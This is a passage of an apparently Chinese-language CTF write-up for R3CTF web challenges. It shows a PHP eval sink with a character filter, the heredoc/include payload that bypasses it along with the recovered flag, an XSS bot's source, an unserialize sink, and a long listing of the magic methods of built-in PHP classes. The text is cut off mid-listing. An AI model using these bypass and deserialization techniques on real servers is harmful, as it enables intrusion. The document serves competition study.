        <content type="html"><![CDATA[<h3 id="Evalgelist"><a href="#Evalgelist" class="headerlink" title="Evalgelist"></a>Evalgelist</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div class="output"&gt;'</span><span class="token punctuation">;</span>            <span class="token variable">$filtered</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'$'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'('</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">')'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"?"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$filtered</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'();'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;strong&gt;After Security Filtering:&lt;/strong&gt; &lt;span class="filtered"&gt;'</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/span&gt;'</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n\n"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;strong&gt;Execution Result:&lt;/strong&gt;'</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div style="border-left: 3px solid #007bff; padding-left: 15px; margin-left: 10px;"&gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">ob_get_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;span class="success"&gt;✅ Function executed successfully!&lt;/span&gt;'</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>                    <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;span class="success"&gt;✅ Function executed (no output)&lt;/span&gt;'</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Error</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;span class="error"&gt;❌ Error: '</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/span&gt;'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;span class="error"&gt;❌ Exception: '</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/span&gt;'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>                        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/div&gt;'</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/div&gt;'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong><code>DIRECTORY_SEPARATOR</code></strong>：这是 PHP 的一个预定义常量，在 Windows 系统中代表反斜杠<code>\</code>，在 Linux/Mac 系统中代表正斜杠<code>/</code>，其作用是确保文件路径分隔符能适配不同的操作系统。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">include DIRECTORY_SEPARATOR.&lt;&lt;&lt;EOFflagEOF; echo phpversion<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>?input=include%20DIRECTORY_SEPARATOR.&lt;&lt;&lt;EOF%0D%0Aflag%0D%0AEOF;%20%0D%0Aecho%20phpversion</code></p><p><code>R3CTF{No-fIlT3r_1s-5Af3-3Sp3C1Al1y-In-PhP-50-MY-fr13ND-d0NT-trY_3v4l_1n_Y0ur_Pr0duct10n_Cod30} 7.3.33</code></p><hr><h3 id="Silent-Profit"><a href="#Silent-Profit" class="headerlink" title="Silent Profit"></a>Silent Profit</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">const express <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>const puppeteer <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">'puppeteer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>const app <span class="token operator">=</span> express<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span>use<span class="token punctuation">(</span>express<span class="token punctuation">.</span>urlencoded<span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> false <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>const flag <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> ?? <span class="token string">'flag{test_flag}'</span><span class="token punctuation">;</span>const PORT <span class="token operator">=</span> process<span class="token punctuation">.</span>env?<span class="token punctuation">.</span>BOT_PORT <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">31337</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'/report'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>  const <span class="token punctuation">{</span> url <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>!url <span class="token operator">|</span><span class="token operator">|</span> !url<span class="token punctuation">.</span>startsWith<span class="token punctuation">(</span><span class="token string">'http://challenge/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'Invalid URL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span>log<span class="token punctuation">(</span>`<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Visiting<span class="token punctuation">:</span> $<span class="token punctuation">{</span>url<span class="token punctuation">}</span>`<span class="token punctuation">)</span><span class="token punctuation">;</span>    const browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span>launch<span class="token punctuation">(</span><span class="token punctuation">{</span>      headless<span class="token punctuation">:</span> <span class="token string">'new'</span><span class="token punctuation">,</span>      args<span class="token punctuation">:</span> <span class="token punctuation">[</span>        <span class="token string">'--no-sandbox'</span><span class="token punctuation">,</span>        <span class="token string">'--disable-setuid-sandbox'</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> browser<span class="token punctuation">.</span>setCookie<span class="token punctuation">(</span><span class="token punctuation">{</span> name<span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span> value<span class="token punctuation">:</span> flag<span class="token punctuation">,</span> domain<span class="token punctuation">:</span> <span class="token string">'challenge'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    const page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span>newPage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> page<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span> waitUntil<span class="token punctuation">:</span> <span class="token string">'networkidle2'</span><span class="token punctuation">,</span> timeout<span class="token punctuation">:</span> <span class="token number">5000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> page<span class="token punctuation">.</span>waitForNetworkIdle<span class="token punctuation">(</span><span class="token punctuation">{</span>timeout<span class="token punctuation">:</span> <span class="token number">5000</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> browser<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'URL visited by bot!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> catch <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span>error<span class="token punctuation">(</span>`<span class="token punctuation">[</span>!<span class="token punctuation">]</span> Error visiting URL<span class="token punctuation">:</span>`<span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'Bot error visiting URL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span>send<span class="token punctuation">(</span>`    <span class="token operator">&lt;</span>h2<span class="token operator">&gt;</span>XSS Bot<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"POST"</span> action<span class="token operator">=</span><span class="token string">"/report"</span><span class="token operator">&gt;</span>      <span class="token operator">&lt;</span><span class="token builtin">input</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"url"</span> value<span class="token operator">=</span><span class="token string">"http://challenge/?data=..."</span> style<span class="token operator">=</span><span class="token string">"width: 500px;"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>      <span class="token operator">&lt;</span>button <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">"submit"</span><span class="token operator">&gt;</span>Submit<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>  `<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span>listen<span class="token punctuation">(</span>PORT<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span>log<span class="token punctuation">(</span>`XSS bot running at port $<span class="token punctuation">{</span>PORT<span class="token punctuation">}</span>`<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h6 id="空值合并操作符"><a href="#空值合并操作符" class="headerlink" title="空值合并操作符 ??"></a>空值合并操作符 <code>??</code></h6><ul><li>语法：<code>value1 ?? value2</code></li><li>作用：如果 <code>value1</code> 是 <strong><code>null</code> 或 <code>undefined</code></strong>，则返回 <code>value2</code>；否则返回 <code>value1</code>。</li><li>与逻辑或操作符<code>||</code>的区别：<ul><li><code>||</code> 返回第一个<strong>真值</strong>（如 <code>0</code>、<code>''</code>、<code>false</code> 会被视为假值）。</li><li><code>??</code> 仅在值为 <code>null</code> 或 <code>undefined</code> 时才返回默认值，更适合设置默认配置。</li></ul></li></ul></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行这个查看原生类的魔术方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string single-quoted-string">'__construct'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__toString'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__call'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__get'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__set'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__isset'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__unset'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__invoke'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'__set_state'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'::'</span> <span class="token operator">.</span> <span class="token variable">$method</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token constant">D</span><span class="token punctuation">:</span>\phpstudy_pro\Extensions\php\php7<span class="token operator">.</span><span class="token number">3.4</span>nts\php<span class="token operator">.</span>exe <span class="token constant">D</span><span class="token punctuation">:</span>\untitled4\r3ctf<span class="token operator">.</span>php<span class="token class-name static-context">Exception</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">Exception</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">Exception</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ErrorException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ErrorException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">ErrorException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">Error</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">Error</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">Error</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">CompileError</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">CompileError</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">CompileError</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ParseError</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ParseError</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">ParseError</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">TypeError</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">TypeError</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">TypeError</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ArgumentCountError</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ArgumentCountError</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">ArgumentCountError</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">ArithmeticError</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ArithmeticError</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">ArithmeticError</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">DivisionByZeroError</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DivisionByZeroError</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">DivisionByZeroError</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">Generator</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">ClosedGeneratorException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ClosedGeneratorException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">ClosedGeneratorException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">DateTime</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DateTime</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">DateTime</span><span class="token operator">::</span><span class="token constant">__set_state</span><span class="token class-name static-context">DateTimeImmutable</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DateTimeImmutable</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">DateTimeImmutable</span><span class="token operator">::</span><span class="token constant">__set_state</span><span class="token class-name static-context">DateTimeZone</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DateTimeZone</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">DateTimeZone</span><span class="token operator">::</span><span class="token constant">__set_state</span><span class="token class-name static-context">DateInterval</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DateInterval</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">DateInterval</span><span class="token operator">::</span><span class="token constant">__set_state</span><span class="token class-name static-context">DatePeriod</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DatePeriod</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">DatePeriod</span><span class="token operator">::</span><span class="token constant">__set_state</span><span class="token class-name static-context">JsonException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">JsonException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">JsonException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">LogicException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">LogicException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">LogicException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">BadFunctionCallException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">BadFunctionCallException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">BadFunctionCallException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">BadMethodCallException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">BadMethodCallException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">BadMethodCallException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">DomainException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DomainException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">DomainException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">InvalidArgumentException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">InvalidArgumentException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">InvalidArgumentException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">LengthException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">LengthException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">LengthException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">OutOfRangeException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">OutOfRangeException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">OutOfRangeException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">RuntimeException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">RuntimeException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">RuntimeException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">OutOfBoundsException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">OutOfBoundsException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">OutOfBoundsException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">OverflowException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">OverflowException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">OverflowException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">RangeException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">RangeException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">RangeException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">UnderflowException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">UnderflowException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">UnderflowException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">UnexpectedValueException</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">UnexpectedValueException</span><span class="token operator">::</span><span class="token constant">__wakeup</span><span class="token class-name static-context">UnexpectedValueException</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">RecursiveIteratorIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">IteratorIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">FilterIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">RecursiveFilterIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">CallbackFilterIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">RecursiveCallbackFilterIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ParentIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">LimitIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">CachingIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">CachingIterator</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">RecursiveCachingIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">RecursiveCachingIterator</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">NoRewindIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">AppendIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">InfiniteIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">RegexIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">RecursiveRegexIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">RecursiveTreeIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ArrayObject</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">ArrayIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">RecursiveArrayIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">SplFileInfo</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">SplFileInfo</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">DirectoryIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">DirectoryIterator</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">FilesystemIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">FilesystemIterator</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">RecursiveDirectoryIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">RecursiveDirectoryIterator</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">GlobIterator</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">GlobIterator</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">SplFileObject</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">SplFileObject</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name static-context">SplTempFileObject</span><span class="token operator">::</span><span class="token constant">__construct</span><span class="token class-name static-context">SplTempFileObject</span><span class="token operator">::</span><span class="token constant">__toString</span><span class="token class-name 